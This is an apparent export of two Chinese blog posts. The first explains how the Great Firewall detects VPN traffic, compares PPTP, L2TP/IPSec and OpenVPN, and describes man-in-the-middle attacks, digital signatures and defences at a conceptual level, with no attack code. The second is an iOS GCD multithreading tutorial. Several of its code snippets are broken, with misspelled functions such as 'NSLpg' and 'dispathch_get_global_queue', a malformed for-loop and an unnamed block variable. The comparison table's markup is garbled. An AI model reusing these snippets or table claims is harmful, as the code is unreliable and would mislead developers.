                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%8812.36.06.png" alt="屏幕快照 2017-10-07 上午12.36.06.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午12.36.06.png</p>
            </figure>
<p>通常VPN协议都会对数据流进行强加密处理，从而使得第三方无法知道数据内容，这样就实现了翻墙。翻墙时VPN服务器知道你干的所有事情（HTTP，对于HTTPS，它知道你去了哪）。</p>
<p>VPN有多种协议：OPENVPN、PPTP、L2TP/IPSec、SSLVPN、IKEv2 VPN，Cisco VPN等。其中的PPTP和L2TP是明文传输协议。只负责传输，不负责加密。分别利用了MPPE和IPSec进行加密。</p>
<table>
<thead>
<tr>
<th></th>
<th>[<figure class="image-box">
                <img src="https://liweitianux.files.wordpress.com/2011/04/ovpn-logo.png?w=135&h=25" alt="PPTP](https://liweitianux.files.wordpress.com/2011/04/pptp-logo.png?w=135&h=25)](https://en.wikipedia.org/wiki/Point-to-Point_Tunneling_Protocol) | [![L2TP/IPSec](https://liweitianux.files.wordpress.com/2011/04/l2tp-logo.png?w=135&h=25)](https://en.wikipedia.org/wiki/Layer_2_Tunneling_Protocol) | ![OpenVPN" title="" class="">
                <p>PPTP](https://liweitianux.files.wordpress.com/2011/04/pptp-logo.png?w=135&h=25)](https://en.wikipedia.org/wiki/Point-to-Point_Tunneling_Protocol) | [![L2TP/IPSec](https://liweitianux.files.wordpress.com/2011/04/l2tp-logo.png?w=135&h=25)](https://en.wikipedia.org/wiki/Layer_2_Tunneling_Protocol) | ![OpenVPN</p>
            </figure></th>
</tr>
</thead>
<tbody>
<tr>
<td>背景</td>
<td>PPTP 是一个基于 PPP 的很基本的协议。PPTP 是微软 Windows 平台第一个支持的 VPN 协议。PPTP 标准并没有实际描述加密和授权特性，并且依赖于 PPP 协议的隧道来实现安全功能。</td>
<td>L2TP 是一个在 IETF <a href="https://tools.ietf.org/html/rfc3193" target="_blank" rel="external">RFC 3193</a> 中被正式标准化的高级协议。推荐在需要安全加密的地方用来替代 PPTP。</td>
<td>OpenVPN 是一个高级的开源 VPN 解决方案，由 “OpenVPN technologies” 支持，并且已经成为开源网络领域里的事实标准。OpenVPN 使用成熟的 SSL/TLS 加密协议。</td>
</tr>
<tr>
<td>数据加密</td>
<td>PPP 负载是使用微软点对点协议（Microsoft’s Point-to-Point Encryption protocol，<a href="https://en.wikipedia.org/wiki/Microsoft_Point-to-Point_Encryption" target="_blank" rel="external">MPPE</a>）加密。MPPE 实现了 RSA <a href="https://en.wikipedia.org/wiki/RC4" target="_blank" rel="external">RC4</a> 加密算法，并使用最长 128 位密钥。</td>
<td>L2TP 负载使用标准的 IPSec 协议加密。在 <a href="https://tools.ietf.org/html/rfc4835" target="_blank" rel="external">RFC 4835</a> 中指定了使用 3DES 或 AES 加密算法作为保密方式。</td>
<td>OpenVPN 使用 <a href="https://en.wikipedia.org/wiki/OpenSSL" target="_blank" rel="external">OpenSSL</a> 库来提供加密。OpenSSL 支持好几种不同的加密算法，如：3DES，AES，RC5 等。</td>
</tr>
<tr>
<td>安装/配置</td>
<td>Windows 所有版本和大多数其他操作系统包括移动平台都内建了对 PPTP 的支持。PPTP 只需要一个用户名和密码，以及一个服务器地址，所以安装和配置相当简单。</td>
<td>从 2000/XP 起的所有 Windows 平台和 Mac OS X 10.3+ 都内建了 L2TP/IPSec 的支持。大多数现代的移动平台比如 iPhone 和 Android 也有内建的客户端。</td>
<td>OpenVPN 不包含在任何操作系统中，需要安装客户端软件，但安装也是相当简单，基本上 5 分钟可以完成。</td>
</tr>
<tr>
<td>速度</td>
<td>由于使用 128 位密钥，加密开销相比 OpenVPN 使用 256位密钥要小，所以速度感觉稍快一点，但这个差异微不足道。</td>
<td>L2TP/IPSec 将数据封装两次，所以相比其他竞争者效率稍低，速度也慢一些。</td>
<td>当使用默认的 UDP 模式，OpenVPN 的表现是最佳的。</td>
</tr>
<tr>
<td>端口</td>
<td>PPTP 使用 TCP 1723 端口和 GRE（协议 47）。通过限制 GRE 协议，PPTP 可以轻易地被封锁。</td>
<td>L2TP/IPSec 使用 UDP 500 端口用来初始化密钥交换，使用协议 50 用来传输 IPSec 加密的数据（ ESP ），使用 UDP 1701 端口用来初始化 L2TP 的配置，还使用 UDP 4500 端口来穿过 NAT。L2TP/IPSec 相比 OpenVPN 容易封锁，因为它依赖于固定的协议和端口。</td>
<td>OpenVPN 可以很容易的配置为使用任何端口运行，也可以使用 UDP 或 TCP 协议。为了顺利穿越限制性的防火墙，可以将 OpenVPN 配置成使用 TCP 443 端口，因为这样就无法和标准的 HTTPS 无法区分，从而极难被封锁。</td>
</tr>
<tr>
<td>稳定性/兼容性</td>
<td>PPTP 不如 OpenVPN 可靠，也不能像 OpenVPN 那样在不稳定网络中快速恢复。另外还有部分同 GRE 协议和一些路由器的兼容性问题。</td>
<td>L2TP/IPSec 比 OpenVPN 更复杂，为了使在 NAT 路由器下的设备可靠地使用，配置可以会更加困难。但是，只要服务器和客户端都支持 NAT 穿越，那么就没什么问题了。</td>
<td>无论是无线网络、蜂窝网络，还是丢包和拥塞经常发生的不可靠网络，OpenVPN 都非常稳定、快速。对于那些相当不可以的连接，OpenVPN 有一个 TCP 模式可以使用，但是要牺牲一点速度，因为将 TCP 封装在 TCP 时效率不高。</td>
</tr>
<tr>
<td>安全弱点</td>
<td>微软实现的 PPTP 有一个严重的安全问题（<a href="https://www.schneier.com/paper-pptpv2.html" target="_blank" rel="external">serious security vulnerabilities</a>）。对于词典攻击来说 MSCHAP-v2 是很脆弱的，并且 RC4 算法也会遭到“<a href="https://en.wikipedia.org/wiki/Bit-flipping_attack" target="_blank" rel="external">位翻转攻击（ bit-flipping attack ）</a>”。如果保密是重要的，微软也强烈建议升级到 IPSec。</td>
<td>IPSec 没有明显的漏洞，当和安全加密算法如 AES 一起使用时，被认为是很安全的。</td>
<td>OpenVPN 也没有明显漏洞，当和安全加密算法如 AES 一起使用时，也被认为是相当安全的。</td>
</tr>
<tr>
<td>客户端的兼容性</td>
<td>WindowsMac OS XLinuxApple iOSAndroidDD-WRT</td>
<td>WindowsMac OS XLinuxApple iOSAndroid</td>
<td>WindowsMac OS XLinux</td>
</tr>
<tr>
<td>结论</td>
<td>由于主要的安全漏洞，除了兼容性以外没有好的理由选择使用 PPTP。如果你的设备既不支持 L2TP/IPSec 又不支持 OpenVPN，那么 PPTP 是一个合理的选择。如果关心快速安装和简易配置，那么 L2TP/IPSec 值得考虑。</td>
<td>L2TP/IPSec 是优秀的，但相比 OpenVPN 的高效和杰出的稳定性要落后一点。如果你使用运行 iOS 或 Android 的移动设备，那么这就是最佳的选择，因为 OpenVPN 目前还不支持这些平台。另外，如果需要快速安装，L2TP/IPSec 也是一个较佳的选择。</td>
<td>对于所有的 Windows, Mac OS X 以及 Linux 桌面用户来说，OpenVPN 是最好的选择。OpenVPN 速度快，并且安全可信。但劣势是缺乏对移动设备的支持，另外还需要安装第三方客户端。</td>
</tr>
<tr>
<td>等级</td>
<td><figure class="image-box">
                <img src="https://liweitianux.files.wordpress.com/2011/04/5stars.png?w=130&h=25" alt="1/5](https://liweitianux.files.wordpress.com/2011/04/1star.png?w=130&h=25) | ![4/5](https://liweitianux.files.wordpress.com/2011/04/4stars.png?w=130&h=25) | ![5/5" title="" class="">
                <p>1/5](https://liweitianux.files.wordpress.com/2011/04/1star.png?w=130&h=25) | ![4/5](https://liweitianux.files.wordpress.com/2011/04/4stars.png?w=130&h=25) | ![5/5</p>
            </figure></td>
</tr>
</tbody>
</table>
<p>对于VPN和其他一些加密的传输的协议来说，没有办法直接获取明文的请求信息，所以没有办法直接封锁，而是使用了监控的方式：</p>
<p><strong>暴力破解：</strong></p>
<blockquote>
<p>对于一些使用弱加密方式的协议来说，直接使用暴力破解检查传输内容。比如PPTP使用MPPE加密，但是MPPE是基于RC4，对于强大的防火墙背后的超级计算机集群，破解就是几秒钟的事情。</p>
<p>破解后明文中一旦包含了违禁内容，请求就会被封。而对应的IP可能会进入重点关怀列表。</p>
</blockquote>
<p><strong>特征检测：</strong></p>
<blockquote>
<p>要想成功翻墙都必须与对应的远程服务器建立连接，然后再用对应的协议进行数据处理并传输。<br>而问题就出在这里：翻墙工具和远程服务器建立连接时，如果表现的很独特，在一大堆流量里很显眼，就会轻易被GFW识别出从而直接阻断连接，而VPN（尤其是OPENVPN）和SSH这方面的问题尤其严重。</p>
</blockquote>
<p>流量监控:</p>
<blockquote>
<p>当一个VPN地址被大量人请求，并保持长时间连接时，就很容易引起关注。SSH接口有大量数据请求。一般会结合其他特征。</p>
</blockquote>
<p>深度包检测：</p>
<blockquote>
<p><strong>深度数据包检测</strong>（英语：Deep packet inspection，缩写为 DPI），又称<strong>完全数据包探测</strong>（complete packet inspection）或<strong>信息萃取</strong>（Information eXtraction，IX），是一种<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E8%84%91%E7%BD%91%E7%BB%9C" target="_blank" rel="external">电脑网络</a><a href="https://zh.wikipedia.org/wiki/%E5%B0%81%E5%8C%85%E8%BF%87%E6%BB%A4" target="_blank" rel="external">数据包过滤</a>技术，用来检查通过检测点之<a href="https://zh.wikipedia.org/wiki/%E5%B0%81%E5%8C%85" target="_blank" rel="external">数据包</a>的<a href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99" target="_blank" rel="external">数据</a>部分（亦可能包含其<a href="https://zh.wikipedia.org/wiki/%E6%A8%99%E9%A0%AD" target="_blank" rel="external">标头</a>），以搜索不匹配规范之协议、<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E7%97%85%E6%AF%92" target="_blank" rel="external">病毒</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9E%83%E5%9C%BE%E9%83%B5%E4%BB%B6" target="_blank" rel="external">垃圾邮件</a>、入侵，或以预定之准则来决定数据包是否可通过或需被路由至其他不同目的地，亦或是为了收集统计数据之目的。</p>
</blockquote>
<p>下面可以通过一张图来说明特征检测、流量监控的原理：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%881.04.43.png" alt="屏幕快照 2017-10-07 上午1.04.43.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午1.04.43.png</p>
            </figure>
<p>有一些天朝的屁民觉得翻墙很帅，妄图利用一些免费或者收费的VPN去浏览一些危险的网站，想要搞个大新闻，其实是不存在的，被钓鱼执法的可能性也不是没有，所以提醒大家最好不要使用不安全的VPN来访问一些不合适的网页：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%881.08.55.png" alt="屏幕快照 2017-10-07 上午1.08.55.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午1.08.55.png</p>
            </figure>
<p>这就是封锁VPN的手段图了，所谓道高一尺，魔高一丈，ss和ssr在这里暂且先不提。</p>
<h2 id="Man-in-Middle-attack"><a href="#Man-in-Middle-attack" class="headerlink" title="Man in Middle attack"></a>Man in Middle attack</h2><p>Man-in-middle attack中文翻译过来也就是中间人攻击，是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。</p>
<p>在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的<code>Wi-Fi 无线接入点</code>的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络，进而监控或者伪造所有的网络请求）。</p>
<p>一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个缺乏相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，<a href="https://zh.wikipedia.org/wiki/SSL" target="_blank" rel="external">SSL</a>协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。</p>
<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>既然说到了证书就来举例子形象的说一下什么是数字签名和数字证书，这里需要首先知道ssh以及公私钥的基础知识。</p>
<ol>
<li>现在鲍勃和他的朋友们采用RSA算法加密的邮件进行通信，鲍勃将自己的公钥分给自己的朋友，他的朋友使用公钥对邮件加密，然后鲍勃在用自己的私钥解密，本来只要私钥没有被泄漏，这个邮件就是安全的。</li>
<li>现在鲍勃给朋友们回信，决定采用数字签名。他写完邮件之后使用hash函数，生成邮件的摘要(digest):</li>
</ol>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%881.41.22.png" alt="屏幕快照 2017-10-07 上午1.41.22.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午1.41.22.png</p>
            </figure>
<ol>
<li>然后鲍勃在使用私钥对这个摘要进行加密，这样就生成了数字签名，然后把这个签名连同邮件一起发送<br><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%881.43.19.png" alt="屏幕快照 2017-10-07 上午1.43.19.png"></li>
<li>朋友收到信件之后使用公钥解密，得到了信件摘要，确定是鲍勃发送过来的，再对邮件本体使用hash函数，和摘要进行对比，如果一样则表示邮件没有被修改过。</li>
<li>这个时候问题来了，有一个恶趣味的同学想要伪装成鲍勃和他朋友通信，偷偷溜进了他朋友的电脑，将鲍勃的公钥换成了自己的公钥，给他朋友发消息，来搞一些大新闻。</li>
<li>但是跑得快的香港朋友一向拥有怀疑精神，就想了一个办法确认这个公钥是不是属于鲍勃，他要求鲍勃去找”证书中心”（certificate authority，简称CA），为公钥做认证。证书中心用自己的私钥，对鲍勃的公钥和一些相关信息一起加密，生成”数字证书”（Digital Certificate）。</li>
</ol>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%881.57.08.png" alt="屏幕快照 2017-10-07 上午1.57.08.png"></p>
<ol>
<li>有了这个权威认证之后，鲍勃再发送邮件，只需要在签名的同时，附上数字证书即可。</li>
<li>朋友收到邮件之后，用CA的公钥解开数字证书，就可以拿到真正的鲍勃公钥，对比一下就可以证实了</li>
</ol>
<p>我们生活中最常用的数字证书的例子就是https协议，这个协议主要用于网页加密</p>
<ol>
<li>首先客户端向服务端发送了一个加密请求</li>
<li>服务器用自己的私钥加密网页以后，连同本身的数字证书，一起发送给客户端。</li>
<li>客户端（浏览器）的”证书管理器”，有”受信任的根证书颁发机构”列表。客户端会根据这张列表，查看解开数字证书的公钥是否在列表之内。</li>
<li>如果证书没有问题，但是数字证书记载的网址，与你正在浏览的网址不一致，就说明这张证书可能被冒用，浏览器会发出警告。</li>
</ol>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%882.08.36.png" alt="屏幕快照 2017-10-07 上午2.08.36.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午2.08.36.png</p>
            </figure>
<ol>
<li>如果这张数字证书不是由受信任的机构颁发的，浏览器会发出另一种警告。</li>
</ol>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-07%20%E4%B8%8A%E5%8D%882.09.32.png" alt="屏幕快照 2017-10-07 上午2.09.32.png" title="" class="">
                <p>屏幕快照 2017-10-07 上午2.09.32.png</p>
            </figure>
<ol>
<li>确认可靠之后，客户端就会使用证书中的服务器公钥，对信息加密，然后和服务器之间进行加密数据交换</li>
</ol>
<h3 id="中间人攻击示例"><a href="#中间人攻击示例" class="headerlink" title="中间人攻击示例"></a>中间人攻击示例</h3><p>假设爱丽丝希望与鲍伯通信。同时，马洛里希望拦截窃会话以进行窃听并可能在某些时候传送给鲍伯一个虚假的消息。</p>
<p>首先，爱丽丝会向鲍勃索取他的公钥。如果Bob将他的公钥发送给Alice，并且此时马洛里能够拦截到这个公钥，就可以实施中间人攻击。马洛里发送给爱丽丝一个伪造的消息，声称自己是鲍伯，并且附上了马洛里自己的（而不是鲍伯的）。</p>
<p>爱丽丝收到公钥后相信这个公钥是鲍伯的，于是爱丽丝将她的消息用马洛里的公钥（爱丽丝以为是鲍伯的）加密，并将加密后的消息回给鲍伯。马洛里再次截获爱丽丝回给鲍伯的消息，并使用马洛里自己的私钥对消息进行解密，如果马洛里愿意，她也可以对消息进行修改，然后马洛里使用鲍伯原先发给爱丽丝的公钥对消息再次加密。当鲍伯收到新加密后的消息时，他会相信这是从爱丽丝那里发来的消息。</p>
<p>1.爱丽丝发送给鲍伯一条消息，却被马洛里截获：</p>
<blockquote>
<p><strong>爱丽丝</strong> “嗨，鲍勃，我是爱丽丝。给我你的公钥”<em> –&gt; <strong>马洛里</strong> <em>*鲍勃</em></em></p>
</blockquote>
<p>2.马洛里将这条截获的消息转送给鲍伯；此时鲍伯并无法分辨这条消息是否从真的爱丽丝那里发来的：</p>
<blockquote>
<p><strong>爱丽丝</strong> <strong>马洛里*</strong>“嗨，鲍勃，我是爱丽丝。给我你的公钥”<em> –&gt; <em>*鲍伯</em></em></p>
</blockquote>
<p>3.鲍伯回应爱丽丝的消息，并附上了他的公钥：</p>
<blockquote>
<p><strong>爱丽丝</strong> <strong>马洛里</strong>&lt;– <em>[鲍伯的公钥]</em>– <strong>鲍伯</strong></p>
</blockquote>
<p>4.马洛里用自己的密钥替换了消息中鲍伯的密钥，并将消息转发给爱丽丝，声称这是鲍伯的公钥：</p>
<blockquote>
<p><strong>爱丽丝</strong>&lt;– <em>[马洛里的公钥]</em>– <strong>马洛里</strong> <strong>鲍勃</strong></p>
</blockquote>
<p>5.爱丽丝用她以为是鲍伯的公钥加密了她的消息，以为只有鲍伯才能读到它：</p>
<blockquote>
<p><strong>爱丽丝</strong> “我们在公共汽车站见面！”–[使用马洛里的公钥加密]<em> –&gt; <strong>马洛里</strong> <em>*鲍勃</em></em></p>
</blockquote>
<p>6.然而，由于这个消息实际上是用马洛里的密钥加密的，所以马洛里可以解密它，阅读它，并在愿意的时候修改它。他使用鲍伯的密钥重新加密，并将重新加密后的消息转发给鲍伯：</p>
<blockquote>
<p><strong>爱丽丝</strong> <strong>马洛里</strong> “在家等我！–[使用鲍伯的公钥加密]–&gt; <strong>鲍伯</strong></p>
</blockquote>
<p>7.鲍勃认为，这条消息是经由安全的传输通道从爱丽丝那里传来的。</p>
<p>这个例子显示了爱丽丝和鲍伯需要某种方法来确定他们是真正拿到了属于对方的公钥，而不是拿到来自攻击者的公钥。否则，这类攻击一般都是可行的，在原理上，可以针对任何使用公钥——密钥技术的通讯消息发起攻击。幸运的是，有各种不同的技术可以帮助抵御MITM攻击。</p>
<h3 id="防御攻击"><a href="#防御攻击" class="headerlink" title="防御攻击"></a>防御攻击</h3><p>那么这种攻击应该如何去防御呢，其实也是有很多种方式的：</p>
<ul>
<li>延迟测试，例如使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</li>
<li>更强力的相互认证，例如：<ul>
<li>密钥（通常是高信息熵的密钥，从而更安全），或</li>
<li>密码（通常是低的信息熵的密钥，从而降低安全性）</li>
</ul>
</li>
</ul>
<h3 id="中间人攻击的取证分析"><a href="#中间人攻击的取证分析" class="headerlink" title="中间人攻击的取证分析"></a>中间人攻击的取证分析</h3><p>从被怀疑是中间人攻击的链接中捕捉网络数据包并进行分析可以确定是否存在中间人攻击。在进行网络分析并对可疑的SSL中间人攻击进行取证时，重要的分析证据包括：</p>
<ul>
<li>远程服务器的IP地址</li>
<li>DNS域名解析服务器</li>
<li>X.509证书服务器<ul>
<li>证书是自签名证书吗？</li>
<li>证书是由信任的颁发机构颁发的吗？</li>
<li>证书是否已被吊销？</li>
<li>证书最近被更改过吗？</li>
<li>在互联网上的其他的客户端是否也得到了相同的证书？</li>
</ul>
</li>
</ul>
<h4 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h4><ul>
<li><a href="https://program-think.blogspot.com/2014/01/dns.html" target="_blank" rel="external">编程随想的博客</a></li>
<li><a href="http://blog.021xt.cc/archives/85" target="_blank" rel="external">上网限制和翻墙基本原理</a></li>
<li><a href="http://www.youdzone.com/signature.html" target="_blank" rel="external">什么是数字签名</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> GFW封锁机制 中间人攻击 数字签名 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS多线程之GCD]]></title>
      <url>/2017/10/05/iOS%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B9%8BGCD/</url>
      <content type="html"><![CDATA[<p>了解到了消息循环之后，接下来就要学习iOS中最常使用的多线程使用方式了—GCD</p>
<a id="more"></a>
<h1 id="iOS多线程之GCD"><a href="#iOS多线程之GCD" class="headerlink" title="iOS多线程之GCD"></a>iOS多线程之GCD</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>GCD的全称是Grand Central Dispatch,纯C语言，提供了非常强大的函数，会自动的利用更多的CPU内核</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//GCD基本演示</div><div class="line">- (void)demo&#123;</div><div class="line">  	//创建任务</div><div class="line">  	dispatch_block_t = ^&#123;</div><div class="line">      NSLpg(@&quot;task&quot;, [NSThread currentThread]);</div><div class="line">	&#125;;</div><div class="line">  	//获取队列</div><div class="line">  	dispatch_queue_t queue = dispathch_get_global_queue(0, 0);</div><div class="line">  	//把任务放进队列</div><div class="line">  	dispatch_async(queue, task);</div><div class="line">&#125;</div><div class="line">//但是一般正常的用法是这样的：</div><div class="line">dispatch_async(dispatch_get_global_queue(0,0), ^&#123;</div><div class="line">   //代码部分</div><div class="line">   NSLog(@&quot;hello world&quot;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>接下来就要说一下GCD和NSThread不同的地方，在NSThread中，需要自己去管理线程的生命周期（开启，睡眠，死亡等），线程同步对于数据的加锁操作会有一定的系统资源开销，而在GCD中，开发者可以不需要直接的去操作线程，而是将所要执行的任务封装成一个unit丢给线程池去处理，线程池会有效的管理线程的并发和生死。可以近似的类比成从MRC到ARC的过程中，内存由程序员手动释放到自动释放的过程。</p>
<h2 id="GCD改写"><a href="#GCD改写" class="headerlink" title="GCD改写"></a>GCD改写</h2><p>之前我们写了一个使用NSThread异步下载图片的例子，现在我们可以使用GCD来改写一下这个程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">dispatch_async(dispatch_get_global_queue(0, 0), ^&#123;</div><div class="line">       NSURL *url = [NSURL URLWithString:@&quot;https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3751777155,630098310&amp;fm=27&amp;gp=0.jpg&quot;];</div><div class="line">       NSData *data = [NSData dataWithContentsOfURL:url];</div><div class="line">       UIImage *image = [UIImage imageWithData:data];</div><div class="line">       //线程间通信 子--&gt;主</div><div class="line">       dispatch_async(dispatch_get_main_queue(), ^&#123;</div><div class="line">           self.testImageView.image = image;</div><div class="line">           //根据图片的大小来调整位置</div><div class="line">           [self.testImageView sizeToFit];</div><div class="line">           [self.scrollView setContentSize:image.size];</div><div class="line">       &#125;);</div><div class="line">   &#125;);</div></pre></td></tr></table></figure>
<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>之前在NSThread中提到了同步和异步的概念，在GCD中有任务和队列的概念 ，通过串行和并行来描述任务执行的方式,同步和异步决定了要不要开启新的线程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//串行队列，同步执行</div><div class="line">dispatch_queue_t serialQueue = dispatch_queue_create(&quot;serialQueue&quot;,  DISPATCH_QUEUE_SERIAL);</div><div class="line">//同步执行</div><div class="line">dispatch_sync(serialQueue, ^&#123;</div><div class="line">        NSLog(@&quot;%@&quot;, [NSThread currentThread]);</div><div class="line">    &#125;);</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//并行队列，异步执行</div><div class="line">dispatch_queue_t concurrentQueue = dispatch_queue_create(&quot;concurrentQueue&quot;, DISPATCH_QUEUE_CONCURRENT);</div><div class="line">//异步执行</div><div class="line">dispatch_async(concurrentQueue, ^&#123;</div><div class="line">        NSLog(@&quot;%@&quot;, [NSThread currentThread]);</div><div class="line">    &#125;);</div></pre></td></tr></table></figure>
<p>这个时候我们可以注意到并行队列异步执行其实是开了多个线程无序的执行，这个时候是效率最大的。如果是并行队列，同步执行的话会有什么样的后果呢？尝试了一下之后发现如果设置为同步执行的话和不开线程的效果一样,任务顺序执行，等于串行队列同步执行。</p>
<h4 id="主队列"><a href="#主队列" class="headerlink" title="主队列"></a>主队列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//得到主队列</div><div class="line">dispatch_queue_t mainQueue = dispatch_get_main_queue();</div><div class="line">//异步执行</div><div class="line">for(int = 1 ; i &lt; 100 ; ++i )&#123;</div><div class="line">	dispatch_async(mainQueue, ^&#123;</div><div class="line">        NSLog(@&quot;main queue %@&quot;, [NSThread currentThread]);</div><div class="line">    &#125;);    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 这样的话所有的任务都会在主线程上执行，打印出来是这样的效果：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-05%20%E4%B8%8A%E5%8D%8810.56.23.png" alt="屏幕快照 2017-10-05 上午10.56.23.png" title="" class="">
                <p>屏幕快照 2017-10-05 上午10.56.23.png</p>
            </figure>
<p>但是如果是同步执行的话，再去打印主队列所在的线程信息，会发现线程会卡在那里，这里展示一张图：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-05%20%E4%B8%8A%E5%8D%8811.29.49.png" alt="屏幕快照 2017-10-05 上午11.29.49.png" title="" class="">
                <p>屏幕快照 2017-10-05 上午11.29.49.png</p>
            </figure>
<p>因为线程是同步执行的，这个时候主线程执行这个主队列的任务，但是主队列又要放到主线程中去执行，主线程是一个特殊的串行队列，所以要等大框执行完了才会执行小框的任务，所以就造成了在一个循环中不停的相互等待,导致线程死锁。这种情况下死锁是因为在主线程下，往主队列中添加任务同步执行产生的。</p>
<h4 id="全局并发队列"><a href="#全局并发队列" class="headerlink" title="全局并发队列"></a>全局并发队列</h4><p>全局并发队列我们可以通过下面这种方式来得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">	现在来解释一下中间这两个参数的意义</div><div class="line">	1.qos_class_t(iOS8之后)，dispatch_queue_priority_t(iOS8之前)</div><div class="line">	第一个参数是为了表示优先级，填0是为了适配两个不同的版本</div><div class="line">	2.flags 没什么用，给未来使用，填0即可</div><div class="line">*/</div><div class="line">dispatch_queue_t queue = dispatch_queue_global_queue(0,0);</div></pre></td></tr></table></figure>
<p>最后放一张关系图来供参考所用：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-05%20%E4%B8%8B%E5%8D%882.40.51.png" alt="屏幕快照 2017-10-05 下午2.40.51.png" title="" class="">
                <p>屏幕快照 2017-10-05 下午2.40.51.png</p>
            </figure>
